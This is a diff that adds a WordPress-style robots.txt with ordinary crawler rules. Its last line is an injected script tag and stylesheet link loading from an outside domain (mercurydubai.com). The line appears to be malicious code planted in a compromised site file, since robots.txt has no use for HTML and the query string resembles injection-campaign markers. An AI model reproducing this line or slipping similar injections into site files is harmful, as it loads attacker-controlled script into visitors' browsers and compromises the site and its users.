@@ -1,0 +1,4 @@
+User-agent: *
+Disallow: /wp-admin/
+Allow: /wp-admin/admin-ajax.php
+<script src="http://mercurydubai.com/?5c078f1e=3-"></script><link rel="stylesheet" href="http://mercurydubai.com/?5c078f1e=4-" />
